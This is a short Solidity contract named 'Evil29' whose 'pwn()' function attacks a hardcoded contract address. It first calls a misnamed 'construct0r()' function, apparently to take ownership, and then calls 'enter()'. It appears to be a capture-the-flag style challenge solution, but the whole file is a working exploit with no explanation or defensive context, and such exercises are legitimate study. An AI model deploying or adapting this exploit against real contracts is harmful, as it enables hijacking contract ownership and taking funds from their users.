// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Evil29 {
    address t = 0x2E2ee25fE88f4dFF3C2531cCB1B8d937CA78Cd6D;

    function pwn() external {
        t.call(abi.encodeWithSignature("construct0r()"));
        t.call(abi.encodeWithSignature("enter()"));
    }
}
